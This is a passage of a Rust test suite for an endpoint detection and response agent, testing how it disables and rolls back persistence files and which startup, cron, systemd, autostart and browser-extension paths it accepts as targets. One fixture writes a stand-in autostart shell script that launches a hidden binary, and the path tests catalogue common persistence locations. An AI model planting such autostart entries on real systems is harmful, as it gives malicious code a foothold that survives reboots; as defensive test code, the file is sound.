            )
            .route(
                "/api/v1/agent/edr/response-executions/{execution_id}/rollback",
                post(agent_edr_response_execution_rollback),
            )
            .route(
                "/api/v1/agent/edr/response-executions/{execution_id}/proof",
                get(agent_edr_response_execution_proof),
            )
            .with_state(state.clone());
        let counter = TEST_POLICY_COUNTER.fetch_add(1, Ordering::Relaxed);
        let autostart_script_dir = std::env::temp_dir().join(format!(
            "clawdstrike-kde-autostart-script-persistence-{}-{counter}/home/alice/.config/autostart-scripts",
            std::process::id()
        ));
        std::fs::create_dir_all(&autostart_script_dir)
            .unwrap_or_else(|e| panic!("failed to create KDE autostart script dir: {e}"));
        let source_path = autostart_script_dir.join("evil-agent.sh");
        std::fs::write(&source_path, b"#!/bin/sh\n/tmp/.cache/evil-agent &\n")
            .unwrap_or_else(|e| panic!("failed to write KDE autostart script: {e}"));
        let observation = EndpointObservation {
            process: EndpointProcess {
                process_guid: Some("proc-disable-kde-autostart-script-1".to_string()),
                image: Some("/usr/bin/kwriteconfig5".to_string()),
                ..EndpointProcess::default()
            },
            event: EndpointEvent::FileAccess {
                operation: FileOperation::Write,
                path: source_path.display().to_string(),
                source_url: None,
                content_preview: None,
            },
            ..EndpointObservation::default()
        };
        let body = serde_json::json!({
            "observations": [observation],
            "honey_artifacts": []
        });
        let req = axum::http::Request::builder()
            .method("POST")
            .uri("/api/v1/agent/edr/findings")
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(body.to_string()))
            .unwrap_or_else(|e| {
                panic!("failed to build KDE autostart script findings request: {e}")
            });
        let response = app
            .clone()
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("KDE autostart script findings request failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);

        let file_node_id = {
            let recorder = state.edr_flight_recorder.lock().await;
            recorder
                .graph()
                .nodes
                .values()
                .find(|node| {
                    node.kind == CausalNodeKind::File
                        && node.label == source_path.display().to_string()
                })
                .map(|node| node.node_id.clone())
                .unwrap_or_else(|| panic!("missing KDE autostart script file graph node"))
        };
        let body = serde_json::json!({
            "action": "disable_persistence",
            "rootNodeId": file_node_id,
            "ttlSeconds": 600,
            "reason": "disable suspicious KDE autostart script",
            "actor": response_action_actor_input(),
            "dryRun": false
        });
        let req = axum::http::Request::builder()
            .method("POST")
            .uri("/api/v1/agent/edr/response-action")
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(body.to_string()))
            .unwrap_or_else(|e| {
                panic!("failed to build KDE autostart script response request: {e}")
            });
        let response = app
            .clone()
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("KDE autostart script response request failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);
        let bytes = axum::body::to_bytes(response.into_body(), 128 * 1024)
            .await
            .unwrap_or_else(|e| panic!("failed to read KDE autostart script response: {e}"));
        let payload: serde_json::Value = serde_json::from_slice(&bytes)
            .unwrap_or_else(|e| panic!("failed to decode KDE autostart script response: {e}"));

        assert_eq!(payload["execution"]["action"], "disable_persistence");
        assert_eq!(payload["execution"]["status"], "succeeded");
        assert_eq!(
            payload["execution"]["effects"][0]["target"],
            source_path.display().to_string()
        );
        assert!(!source_path.exists());
        let disabled_path = PathBuf::from(
            payload["execution"]["effects"][0]["artifact"]
                .as_str()
                .unwrap_or_else(|| panic!("missing KDE autostart script artifact path")),
        );
        assert!(disabled_path.is_file());
        assert_eq!(
            std::fs::read(&disabled_path)
                .unwrap_or_else(|e| panic!("failed to read KDE autostart script artifact: {e}")),
            b"#!/bin/sh\n/tmp/.cache/evil-agent &\n"
        );

        let execution_id = payload["execution"]["executionId"]
            .as_str()
            .unwrap_or_else(|| panic!("missing KDE autostart script execution id"));
        let body = serde_json::json!({
            "reason": "restore KDE autostart script"
        });
        let req = axum::http::Request::builder()
            .method("POST")
            .uri(format!(
                "/api/v1/agent/edr/response-executions/{execution_id}/rollback"
            ))
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(body.to_string()))
            .unwrap_or_else(|e| {
                panic!("failed to build KDE autostart script rollback request: {e}")
            });
        let response = app
            .clone()
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("KDE autostart script rollback request failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);
        assert!(source_path.is_file());
        assert!(!disabled_path.exists());
        assert_response_rollback_proof(
            app,
            execution_id,
            &payload,
            &source_path,
            "KDE autostart script",
        )
        .await;

        let _ = std::fs::remove_file(source_path);
        let _ = std::fs::remove_dir_all(autostart_script_dir);
        let _ = std::fs::remove_dir_all(quarantine_root.as_ref());
        let _ = std::fs::remove_file(&receipt_path);
        let _ = std::fs::remove_file(endpoint_receipt_index_path(&receipt_path));
    }

    #[test]
    fn bounded_shell_startup_persistence_targets_are_user_home_files_only() {
        let temp_shell = std::env::temp_dir()
            .join("clawdstrike-shell-targets/home/alice/.config/fish/config.fish");
        let temp_fish_conf_d = std::env::temp_dir()
            .join("clawdstrike-shell-targets/home/alice/.config/fish/conf.d/evil-agent.fish");
        assert!(path_is_bounded_persistence_target(&temp_shell));
        assert!(path_is_bounded_persistence_target(&temp_fish_conf_d));
        assert!(path_is_bounded_persistence_target(FsPath::new(
            "/home/alice/.bashrc"
        )));
        assert!(path_is_bounded_persistence_target(FsPath::new(
            "/home/alice/.zprofile"
        )));
        assert!(path_is_bounded_persistence_target(FsPath::new(
            "/home/alice/.config/fish/config.fish"
        )));
        assert!(path_is_bounded_persistence_target(FsPath::new(
            "/home/alice/.config/fish/conf.d/evil-agent.fish"
        )));
        assert!(path_is_bounded_persistence_target(FsPath::new(
            "/Users/alice/.zshrc"
        )));
        assert!(path_is_bounded_persistence_target(FsPath::new(
            "/Users/alice/.config/fish/config.fish"
        )));
        assert!(path_is_bounded_persistence_target(FsPath::new(
            "/Users/alice/.config/fish/conf.d/evil-agent.fish"
        )));

        assert!(!path_is_bounded_persistence_target(FsPath::new(
            "/home/root/.bashrc"
        )));
        assert!(!path_is_bounded_persistence_target(FsPath::new(
            "/home/nobody/.profile"
        )));
        assert!(!path_is_bounded_persistence_target(FsPath::new(
            "/home/bad user/.bashrc"
        )));
        assert!(!path_is_bounded_persistence_target(FsPath::new(
            "/home/alice/.ssh/rc"
        )));
        assert!(!path_is_bounded_persistence_target(FsPath::new(
            "/home/alice/.bashrc.d/evil.sh"
        )));
        assert!(!path_is_bounded_persistence_target(FsPath::new(
            "/home/alice/.config/fish/conf.d/.hidden.fish"
        )));
        assert!(!path_is_bounded_persistence_target(FsPath::new(
            "/home/alice/.config/fish/conf.d/clawdstrike.fish"
        )));
        assert!(!path_is_bounded_persistence_target(FsPath::new(
            "/home/alice/.config/fish/conf.d/config.fish"
        )));
        assert!(!path_is_bounded_persistence_target(FsPath::new(
            "/home/alice/.config/fish/conf.d/evil agent.fish"
        )));
        assert!(!path_is_bounded_persistence_target(FsPath::new(
            "/home/alice/.config/fish/conf.d/evil-agent.sh"
        )));
        assert!(!path_is_bounded_persistence_target(FsPath::new(
            "/etc/profile"
        )));
    }

    #[test]
    fn bounded_cron_persistence_targets_are_user_crontabs_or_system_dropins_only() {
        let temp_crontab =
            std::env::temp_dir().join("clawdstrike-cron-targets/var/spool/cron/crontabs/alice");
        let temp_dropin = std::env::temp_dir().join("clawdstrike-cron-targets/etc/cron.d/evil");
        assert!(path_is_bounded_persistence_target(&temp_crontab));
        assert!(path_is_bounded_persistence_target(&temp_dropin));
        assert!(path_is_bounded_persistence_target(FsPath::new(
            "/var/spool/cron/alice"
        )));
        assert!(path_is_bounded_persistence_target(FsPath::new(
            "/usr/lib/cron/tabs/alice"
        )));
        assert!(path_is_bounded_persistence_target(FsPath::new(
            "/etc/cron.d/evil-agent"
        )));

        assert!(!path_is_bounded_persistence_target(FsPath::new(
            "/etc/crontab"
        )));
        assert!(!path_is_bounded_persistence_target(FsPath::new(
            "/etc/cron.d/.hidden"
        )));
        assert!(!path_is_bounded_persistence_target(FsPath::new(
            "/etc/cron.d/clawdstrike"
        )));
        assert!(!path_is_bounded_persistence_target(FsPath::new(
            "/etc/cron.hourly/evil"
        )));
        assert!(!path_is_bounded_persistence_target(FsPath::new(
            "/var/spool/cron/root"
        )));
        assert!(!path_is_bounded_persistence_target(FsPath::new(
            "/var/spool/cron/nobody"
        )));
        assert!(!path_is_bounded_persistence_target(FsPath::new(
            "/var/spool/cron/bad user"
        )));
    }

    #[test]
    fn bounded_profile_d_persistence_targets_are_system_shell_dropins_only() {
        let temp_profile_dropin =
            std::env::temp_dir().join("clawdstrike-profile-targets/etc/profile.d/evil-agent.sh");
        assert!(path_is_bounded_persistence_target(&temp_profile_dropin));
        assert!(path_is_bounded_persistence_target(FsPath::new(
            "/etc/profile.d/evil-agent.sh"
        )));

        assert!(!path_is_bounded_persistence_target(FsPath::new(
            "/etc/profile"
        )));
        assert!(!path_is_bounded_persistence_target(FsPath::new(
            "/etc/profile.d/.hidden.sh"
        )));
        assert!(!path_is_bounded_persistence_target(FsPath::new(
            "/etc/profile.d/clawdstrike.sh"
        )));
        assert!(!path_is_bounded_persistence_target(FsPath::new(
            "/etc/profile.d/bash_completion.sh"
        )));
        assert!(!path_is_bounded_persistence_target(FsPath::new(
            "/etc/profile.d/evil agent.sh"
        )));
        assert!(!path_is_bounded_persistence_target(FsPath::new(
            "/etc/profile.d/evil-agent.txt"
        )));
        assert!(!path_is_bounded_persistence_target(FsPath::new(
            "/usr/local/etc/profile.d/evil-agent.sh"
        )));
    }

    #[test]
    fn bounded_systemd_persistence_targets_are_user_or_system_units_only() {
        let temp_unit = std::env::temp_dir()
            .join("clawdstrike-systemd-targets/home/alice/.config/systemd/user/evil.service");
        let temp_system_unit = std::env::temp_dir()
            .join("clawdstrike-systemd-targets/etc/systemd/system/evil-agent.service");
        let temp_user_dropin = std::env::temp_dir().join(
            "clawdstrike-systemd-targets/home/alice/.config/systemd/user/evil.service.d/override.conf",
        );
        let temp_system_dropin = std::env::temp_dir().join(
            "clawdstrike-systemd-targets/etc/systemd/system/evil-agent.service.d/override.conf",
        );
        assert!(path_is_bounded_persistence_target(&temp_unit));
        assert!(path_is_bounded_persistence_target(&temp_system_unit));
        assert!(path_is_bounded_persistence_target(&temp_user_dropin));
        assert!(path_is_bounded_persistence_target(&temp_system_dropin));
        assert!(path_is_bounded_persistence_target(FsPath::new(
            "/home/alice/.config/systemd/user/evil.timer"
        )));
        assert!(path_is_bounded_persistence_target(FsPath::new(
            "/Users/alice/.config/systemd/user/evil.socket"
        )));
        assert!(path_is_bounded_persistence_target(FsPath::new(
            "/etc/systemd/system/evil-agent.service"
        )));
        assert!(path_is_bounded_persistence_target(FsPath::new(
            "/etc/systemd/system/evil-agent.timer.d/10-env.conf"
        )));

        assert!(!path_is_bounded_persistence_target(FsPath::new(
            "/lib/systemd/system/evil.service"
        )));
        assert!(!path_is_bounded_persistence_target(FsPath::new(
            "/home/root/.config/systemd/user/evil.service"
        )));
        assert!(!path_is_bounded_persistence_target(FsPath::new(
            "/home/alice/.config/systemd/system/evil.service"
        )));
        assert!(!path_is_bounded_persistence_target(FsPath::new(
            "/home/alice/.config/systemd/user/evil path.service"
        )));
        assert!(!path_is_bounded_persistence_target(FsPath::new(
            "/home/alice/.config/systemd/user/evil.conf"
        )));
        assert!(!path_is_bounded_persistence_target(FsPath::new(
            "/home/alice/.config/systemd/user/evil.service.d/override.txt"
        )));
        assert!(!path_is_bounded_persistence_target(FsPath::new(
            "/home/alice/.config/systemd/user/evil.conf.d/override.conf"
        )));
        assert!(!path_is_bounded_persistence_target(FsPath::new(
            "/etc/systemd/system/ssh.service"
        )));
        assert!(!path_is_bounded_persistence_target(FsPath::new(
            "/etc/systemd/system/ssh.service.d/override.conf"
        )));
        assert!(!path_is_bounded_persistence_target(FsPath::new(
            "/etc/systemd/system/systemd-resolved.service"
        )));
        assert!(!path_is_bounded_persistence_target(FsPath::new(
            "/etc/systemd/system/systemd-resolved.service.d/override.conf"
        )));
        assert!(!path_is_bounded_persistence_target(FsPath::new(
            "/etc/systemd/system/clawdstrike.service"
        )));
        assert!(!path_is_bounded_persistence_target(FsPath::new(
            "/etc/systemd/system/evil-agent.service.d/clawdstrike.conf"
        )));
        assert!(!path_is_bounded_persistence_target(FsPath::new(
            "/etc/systemd/system/evil path.service"
        )));
    }

    #[test]
    fn bounded_xdg_autostart_persistence_targets_are_desktop_entries_only() {
        let temp_user_autostart = std::env::temp_dir()
            .join("clawdstrike-xdg-targets/home/alice/.config/autostart/evil-agent.desktop");
        let temp_system_autostart =
            std::env::temp_dir().join("clawdstrike-xdg-targets/etc/xdg/autostart/evil.desktop");
        assert!(path_is_bounded_persistence_target(&temp_user_autostart));
        assert!(path_is_bounded_persistence_target(&temp_system_autostart));
        assert!(path_is_bounded_persistence_target(FsPath::new(
            "/home/alice/.config/autostart/evil-agent.desktop"
        )));
        assert!(path_is_bounded_persistence_target(FsPath::new(
            "/Users/alice/.config/autostart/evil-agent.desktop"
        )));
        assert!(path_is_bounded_persistence_target(FsPath::new(
            "/etc/xdg/autostart/evil-agent.desktop"
        )));

        assert!(!path_is_bounded_persistence_target(FsPath::new(
            "/home/root/.config/autostart/evil-agent.desktop"
        )));
        assert!(!path_is_bounded_persistence_target(FsPath::new(
            "/home/alice/.config/autostart/evil-agent.txt"
        )));
        assert!(!path_is_bounded_persistence_target(FsPath::new(
            "/home/alice/.config/autostart/.hidden.desktop"
        )));
        assert!(!path_is_bounded_persistence_target(FsPath::new(
            "/home/alice/.local/share/applications/evil-agent.desktop"
        )));
        assert!(!path_is_bounded_persistence_target(FsPath::new(
            "/etc/xdg/autostart/org.gnome.SettingsDaemon.DiskUtilityNotify.desktop"
        )));
        assert!(!path_is_bounded_persistence_target(FsPath::new(
            "/etc/xdg/autostart/gnome-keyring-ssh.desktop"
        )));
        assert!(!path_is_bounded_persistence_target(FsPath::new(
            "/etc/xdg/autostart/clawdstrike.desktop"
        )));
        assert!(!path_is_bounded_persistence_target(FsPath::new(
            "/etc/xdg/autostart/evil agent.desktop"
        )));
    }

    #[test]
    fn bounded_plasma_env_persistence_targets_are_user_scripts_only() {
        let temp_plasma_env = std::env::temp_dir().join(
            "clawdstrike-plasma-env-targets/home/alice/.config/plasma-workspace/env/evil-agent.sh",
        );
        assert!(path_is_bounded_persistence_target(&temp_plasma_env));
        assert!(path_is_bounded_persistence_target(FsPath::new(
            "/home/alice/.config/plasma-workspace/env/evil-agent.sh"
        )));
        assert!(path_is_bounded_persistence_target(FsPath::new(
            "/Users/alice/.config/plasma-workspace/env/evil-agent.sh"
        )));

        assert!(!path_is_bounded_persistence_target(FsPath::new(
            "/home/root/.config/plasma-workspace/env/evil-agent.sh"
        )));
        assert!(!path_is_bounded_persistence_target(FsPath::new(
            "/home/alice/.config/plasma-workspace/env/.hidden.sh"
        )));
        assert!(!path_is_bounded_persistence_target(FsPath::new(
            "/home/alice/.config/plasma-workspace/env/clawdstrike.sh"
        )));
        assert!(!path_is_bounded_persistence_target(FsPath::new(
            "/home/alice/.config/plasma-workspace/env/evil agent.sh"
        )));
        assert!(!path_is_bounded_persistence_target(FsPath::new(
            "/home/alice/.config/plasma-workspace/env/evil-agent.txt"
        )));
        assert!(!path_is_bounded_persistence_target(FsPath::new(
            "/etc/xdg/plasma-workspace/env/evil-agent.sh"
        )));
        assert!(!path_is_bounded_persistence_target(FsPath::new(
            "/home/alice/.config/plasma-workspace/shutdown/evil-agent.sh"
        )));
    }

    #[test]
    fn bounded_kde_autostart_script_persistence_targets_are_user_scripts_only() {
        let temp_autostart_script = std::env::temp_dir()
            .join("clawdstrike-kde-autostart-script-targets/home/alice/.config/autostart-scripts/evil-agent.sh");
        assert!(path_is_bounded_persistence_target(&temp_autostart_script));
        assert!(path_is_bounded_persistence_target(FsPath::new(
            "/home/alice/.config/autostart-scripts/evil-agent.sh"
        )));
        assert!(path_is_bounded_persistence_target(FsPath::new(
            "/Users/alice/.config/autostart-scripts/evil-agent.sh"
        )));

        assert!(!path_is_bounded_persistence_target(FsPath::new(
            "/home/root/.config/autostart-scripts/evil-agent.sh"
        )));
        assert!(!path_is_bounded_persistence_target(FsPath::new(
            "/home/alice/.config/autostart-scripts/.hidden.sh"
        )));
        assert!(!path_is_bounded_persistence_target(FsPath::new(
            "/home/alice/.config/autostart-scripts/clawdstrike.sh"
        )));
        assert!(!path_is_bounded_persistence_target(FsPath::new(
            "/home/alice/.config/autostart-scripts/evil agent.sh"
        )));
        assert!(!path_is_bounded_persistence_target(FsPath::new(
            "/home/alice/.config/autostart-scripts/evil-agent.desktop"
        )));
        assert!(!path_is_bounded_persistence_target(FsPath::new(
            "/etc/xdg/autostart-scripts/evil-agent.sh"
        )));
        assert!(!path_is_bounded_persistence_target(FsPath::new(
            "/home/alice/.config/autostart/evil-agent.sh"
        )));
    }

    #[test]
    fn bounded_browser_extension_persistence_targets_are_manifest_files_only() {
        let temp_manifest = std::env::temp_dir().join(
            "clawdstrike-extension-targets/Users/alice/Library/Application Support/Google/Chrome/Default/Extensions/abcdefghijklmnopabcdefghijklmnop/1.0.0/manifest.json",
        );
        let temp_firefox_manifest = std::env::temp_dir().join(
            "clawdstrike-extension-targets/Users/alice/Library/Application Support/Firefox/Profiles/dev.default/extensions/addon@example.com/manifest.json",
        );
        assert!(path_is_bounded_persistence_target(&temp_manifest));
        assert!(path_is_bounded_persistence_target(&temp_firefox_manifest));
        assert!(path_is_bounded_persistence_target(FsPath::new(
            "/Users/alice/Library/Application Support/Microsoft Edge/Default/Extensions/abcdefghijklmnopabcdefghijklmnop/2026.5.16/manifest.json"
        )));
        assert!(path_is_bounded_persistence_target(FsPath::new(
            "/Users/alice/Library/Application Support/Firefox/Profiles/dev.default-release/extensions/{11111111-2222-4333-8444-555555555555}/manifest.json"
        )));
        assert!(path_is_bounded_persistence_target(FsPath::new(
            "/home/alice/.mozilla/firefox/dev.default/extensions/addon@example.com/manifest.json"
        )));

        assert!(!path_is_bounded_persistence_target(FsPath::new(
            "/Users/alice/Library/Application Support/Google/Chrome/Default/Extensions/abcdefghijklmnopabcdefghijklmnop/1.0.0/background.js"
        )));
        assert!(!path_is_bounded_persistence_target(FsPath::new(
            "/Users/alice/Library/Application Support/Firefox/Profiles/dev.default/extensions/addon@example.com/background.js"
        )));
        assert!(!path_is_bounded_persistence_target(FsPath::new(
            "/Users/alice/Library/Application Support/Firefox/Profiles/dev.default/extensions/addon@example.com/nested/manifest.json"
        )));
        assert!(!path_is_bounded_persistence_target(FsPath::new(
            "/Users/alice/Library/Application Support/Firefox/Profiles/dev.default/extensions/.hidden/manifest.json"
        )));
        assert!(!path_is_bounded_persistence_target(FsPath::new(
            "/Users/alice/Library/Application Support/Firefox/Profiles/dev.default/extensions/addon@example.com.xpi"
        )));
        assert!(!path_is_bounded_persistence_target(FsPath::new(
            "/Users/alice/Library/Application Support/Unknown Browser/Default/Extensions/abcdefghijklmnopabcdefghijklmnop/1.0.0/manifest.json"
        )));
        assert!(!path_is_bounded_persistence_target(FsPath::new(
            "/Users/alice/Library/Application Support/Google/Chrome/Default/Extensions/../evil/manifest.json"
        )));
        assert!(!path_is_bounded_persistence_target(FsPath::new(
            "/Users/alice/Library/Application Support/Google/Chrome/Default/Extensions/abcdefghijklmnopabcdefghijklmnop/1.0.0/nested/manifest.json"
        )));
        assert!(!path_is_bounded_persistence_target(FsPath::new(
            "/Applications/Google Chrome.app/Contents/Extensions/abcdefghijklmnopabcdefghijklmnop/1.0.0/manifest.json"
        )));
    }

    #[test]
    fn validate_integrations_requires_api_key_for_datadog() {
        let mut integrations = IntegrationSettings::default();
        integrations.siem.enabled = true;
        integrations.siem.provider = "datadog".to_string();
        integrations.siem.endpoint = "https://us5.datadoghq.com".to_string();
        integrations.siem.api_key = String::new();

        let result = validate_integration_settings(&integrations);
        assert!(result.is_err());
    }

    #[tokio::test]
    async fn integrations_update_roundtrip_without_restart() {
        let state = Arc::new(test_state());
        let app = Router::new()
            .route(
                "/api/v1/agent/integrations",
                get(get_integrations_settings).put(update_integrations_settings),
            )
            .route(
                "/api/v1/agent/integrations/test",
                post(test_integration_delivery),
            )
            .with_state(state);

        let put_req = axum::http::Request::builder()
            .method("PUT")
            .uri("/api/v1/agent/integrations")
            .header("authorization", "Bearer test-token")
            .header("content-type", "application/json")
            .body(axum::body::Body::from(
                r#"{
                    "siem": {
                        "provider": "datadog",
                        "endpoint": "https://us5.datadoghq.com",
                        "api_key": "dd-key",
                        "enabled": true
                    },
                    "apply": false
                }"#,
            ))
            .unwrap_or_else(|e| panic!("failed to build PUT request: {e}"));

        let response = app
            .clone()
            .oneshot(put_req)
            .await
            .unwrap_or_else(|e| panic!("PUT request failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);

        let get_req = axum::http::Request::builder()
            .uri("/api/v1/agent/integrations")
            .header("authorization", "Bearer test-token")
            .body(axum::body::Body::empty())
            .unwrap_or_else(|e| panic!("failed to build GET request: {e}"));
        let response = app
            .oneshot(get_req)
            .await
            .unwrap_or_else(|e| panic!("GET request failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);

        let body = axum::body::to_bytes(response.into_body(), 1024 * 64)
            .await
            .unwrap_or_else(|e| panic!("failed to read response body: {e}"));
        let json: serde_json::Value =
            serde_json::from_slice(&body).unwrap_or_else(|e| panic!("invalid JSON: {e}"));
        assert_eq!(
            json.get("siem")
                .and_then(|v| v.get("provider"))
                .and_then(|v| v.as_str()),
            Some("datadog")
        );
        assert_eq!(
            json.get("siem")
                .and_then(|v| v.get("enabled"))
                .and_then(|v| v.as_bool()),
            Some(true)
        );
    }

    #[tokio::test]
    async fn integrations_invalid_update_does_not_mutate_state() {
        let state = Arc::new(test_state());
        let app = Router::new()
            .route(
                "/api/v1/agent/integrations",
                get(get_integrations_settings).put(update_integrations_settings),
            )
            .with_state(state.clone());

        let put_req = axum::http::Request::builder()
            .method("PUT")
            .uri("/api/v1/agent/integrations")
            .header("authorization", "Bearer test-token")
            .header("content-type", "application/json")
            .body(axum::body::Body::from(
                r#"{
                    "siem": {
                        "provider": "not-supported",
                        "endpoint": "https://example.invalid",
                        "api_key": "abc123",
                        "enabled": true
                    },
                    "apply": false
                }"#,
            ))
            .unwrap_or_else(|e| panic!("failed to build PUT request: {e}"));

        let response = app
            .clone()
            .oneshot(put_req)
            .await
            .unwrap_or_else(|e| panic!("PUT request failed: {e}"));
        assert_eq!(response.status(), StatusCode::BAD_REQUEST);

        let get_req = axum::http::Request::builder()
            .uri("/api/v1/agent/integrations")
            .header("authorization", "Bearer test-token")
            .body(axum::body::Body::empty())
            .unwrap_or_else(|e| panic!("failed to build GET request: {e}"));
        let response = app
            .oneshot(get_req)
            .await
            .unwrap_or_else(|e| panic!("GET request failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);

        let body = axum::body::to_bytes(response.into_body(), 1024 * 64)
            .await
            .unwrap_or_else(|e| panic!("failed to read response body: {e}"));
        let json: serde_json::Value =
            serde_json::from_slice(&body).unwrap_or_else(|e| panic!("invalid JSON: {e}"));
        assert_eq!(
            json.get("siem")
                .and_then(|v| v.get("provider"))
                .and_then(|v| v.as_str()),
            Some("datadog"),
            "Rejected update should not mutate in-memory integrations provider"
        );
    }

    #[tokio::test]
    async fn daemon_proxy_route_requires_auth() {
        let state = Arc::new(test_state());
        let app = Router::new()
            .route("/api/v1/audit", get(proxy_daemon_get))
            .with_state(state);

        let request = axum::http::Request::builder()
            .uri("/api/v1/audit")
            .body(axum::body::Body::empty())
            .unwrap_or_else(|e| panic!("failed to build request: {e}"));
        let response = app
            .oneshot(request)
            .await
            .unwrap_or_else(|e| panic!("request failed: {e}"));

        assert_eq!(response.status(), StatusCode::UNAUTHORIZED);
    }

    #[tokio::test]
    async fn gateway_request_is_denied_when_policy_blocks() {
        let state = Arc::new(test_state());
        {
            let mut settings = state.settings.write().await;
            settings.daemon_port = 1;
        }
        let app = Router::new()
            .route("/api/v1/openclaw/request", post(gateway_request))
            .with_state(state);

        let request = axum::http::Request::builder()
            .method("POST")
            .uri("/api/v1/openclaw/request")
            .header("authorization", "Bearer test-token")
            .header("content-type", "application/json")
            .body(axum::body::Body::from(
                r#"{"gateway_id":"gw-1","method":"node.list","timeout_ms":1000}"#,
            ))
            .unwrap_or_else(|e| panic!("failed to build request: {e}"));
        let response = app
            .oneshot(request)
            .await
            .unwrap_or_else(|e| panic!("request failed: {e}"));

        assert_eq!(response.status(), StatusCode::FORBIDDEN);
        let body = axum::body::to_bytes(response.into_body(), 1024 * 64)
            .await
            .unwrap_or_else(|e| panic!("failed to read body: {e}"));
        let body_text =
            String::from_utf8(body.to_vec()).unwrap_or_else(|e| panic!("invalid utf8 body: {e}"));
        assert!(
            body_text.contains("Policy daemon unreachable"),
            "expected policy deny reason, got: {body_text}"
        );
    }

    #[tokio::test]
    async fn gateway_request_reaches_relay_when_policy_allows() {
        let state = Arc::new(test_state());
        {
            let mut settings = state.settings.write().await;
            settings.enabled = false;
        }

        let app = Router::new()
            .route("/api/v1/openclaw/request", post(gateway_request))
            .with_state(state);

        let request = axum::http::Request::builder()
            .method("POST")
            .uri("/api/v1/openclaw/request")
            .header("authorization", "Bearer test-token")
            .header("content-type", "application/json")
            .body(axum::body::Body::from(
                r#"{"gateway_id":"gw-1","method":"node.list","timeout_ms":1000}"#,
            ))
            .unwrap_or_else(|e| panic!("failed to build request: {e}"));
        let response = app
            .oneshot(request)
            .await
            .unwrap_or_else(|e| panic!("request failed: {e}"));

        assert_eq!(response.status(), StatusCode::INTERNAL_SERVER_ERROR);
        let body = axum::body::to_bytes(response.into_body(), 1024 * 64)
            .await
            .unwrap_or_else(|e| panic!("failed to read body: {e}"));
        let body_text =
            String::from_utf8(body.to_vec()).unwrap_or_else(|e| panic!("invalid utf8 body: {e}"));
        assert!(
            body_text.contains("not connected"),
            "expected relay error from OpenClaw manager, got: {body_text}"
        );
    }

    #[tokio::test]
    async fn integrations_routes_require_auth() {
        let state = Arc::new(test_state());
        let app = Router::new()
            .route(
                "/api/v1/agent/integrations",
                get(get_integrations_settings).put(update_integrations_settings),
            )
            .route(
                "/api/v1/agent/integrations/test",
                post(test_integration_delivery),
            )
            .with_state(state);

        let get_req = axum::http::Request::builder()
            .method("GET")
            .uri("/api/v1/agent/integrations")
            .body(axum::body::Body::empty())
            .unwrap_or_else(|e| panic!("failed to build GET request: {e}"));
        let get_response = app
            .clone()
            .oneshot(get_req)
            .await
            .unwrap_or_else(|e| panic!("GET request failed: {e}"));
        assert_eq!(get_response.status(), StatusCode::UNAUTHORIZED);

        let put_req = axum::http::Request::builder()
            .method("PUT")
            .uri("/api/v1/agent/integrations")
            .header("content-type", "application/json")
            .body(axum::body::Body::from(r#"{"apply":false}"#))
            .unwrap_or_else(|e| panic!("failed to build PUT request: {e}"));
        let put_response = app
            .clone()
            .oneshot(put_req)
            .await
            .unwrap_or_else(|e| panic!("PUT request failed: {e}"));
        assert_eq!(put_response.status(), StatusCode::UNAUTHORIZED);

        let post_req = axum::http::Request::builder()
            .method("POST")
            .uri("/api/v1/agent/integrations/test")
            .header("content-type", "application/json")
            .body(axum::body::Body::from(r#"{"target":"siem"}"#))
            .unwrap_or_else(|e| panic!("failed to build POST request: {e}"));
        let post_response = app
            .oneshot(post_req)
            .await
            .unwrap_or_else(|e| panic!("POST request failed: {e}"));
        assert_eq!(post_response.status(), StatusCode::UNAUTHORIZED);
    }

    #[test]
    fn daemon_proxy_target_preserves_path_and_query() {
        let uri: Uri = "/api/v1/audit?limit=25&decision=block"
            .parse()
            .unwrap_or_else(|err| panic!("failed to parse uri: {err}"));
        let target = build_daemon_proxy_target("http://127.0.0.1:9876", &uri)
            .unwrap_or_else(|err| panic!("failed to build target: {err:?}"));
        assert_eq!(
            target,
            "http://127.0.0.1:9876/api/v1/audit?limit=25&decision=block"
        );
    }

    #[test]
    fn merged_authorization_header_prefers_explicit_hushd_header() {
        let mut headers = HeaderMap::new();
        headers.insert(
            HUSHD_AUTHORIZATION_HEADER,
            "Bearer daemon-from-request"
                .parse()
                .unwrap_or_else(|err| panic!("failed to parse daemon auth header: {err}")),
        );
        headers.insert(
            AUTHORIZATION,
            "Bearer local-agent-token"
                .parse()
                .unwrap_or_else(|err| panic!("failed to parse auth header: {err}")),
        );

        let merged = merged_authorization_header(&headers, Some("from-settings"));
        assert_eq!(merged.as_deref(), Some("Bearer daemon-from-request"));
    }

    #[test]
    fn merged_authorization_header_uses_request_authorization_when_present() {
        let mut headers = HeaderMap::new();
        headers.insert(
            AUTHORIZATION,
            "Bearer from-request"
                .parse()
                .unwrap_or_else(|err| panic!("failed to parse auth header: {err}")),
        );

        let merged = merged_authorization_header(&headers, Some("from-settings"));
        assert_eq!(merged.as_deref(), Some("Bearer from-request"));
    }

    #[test]
    fn merged_authorization_header_falls_back_to_settings_key() {
        let headers = HeaderMap::new();
        let merged = merged_authorization_header(&headers, Some("daemon-key"));
        assert_eq!(merged.as_deref(), Some("Bearer daemon-key"));
    }

    #[test]
    fn settings_update_distinguishes_absent_vs_null_active_gateway_id() {
        let absent: AgentSettingsUpdate = match serde_json::from_str("{}") {
            Ok(value) => value,
            Err(err) => panic!("failed to parse absent payload: {}", err),
        };
        assert!(absent.openclaw_active_gateway_id.is_none());

        let explicit_null: AgentSettingsUpdate =
            match serde_json::from_str(r#"{"openclaw_active_gateway_id":null}"#) {
                Ok(value) => value,
                Err(err) => panic!("failed to parse null payload: {}", err),
            };
        assert!(matches!(
            explicit_null.openclaw_active_gateway_id,
            Some(None)
        ));

        let explicit_value: AgentSettingsUpdate =
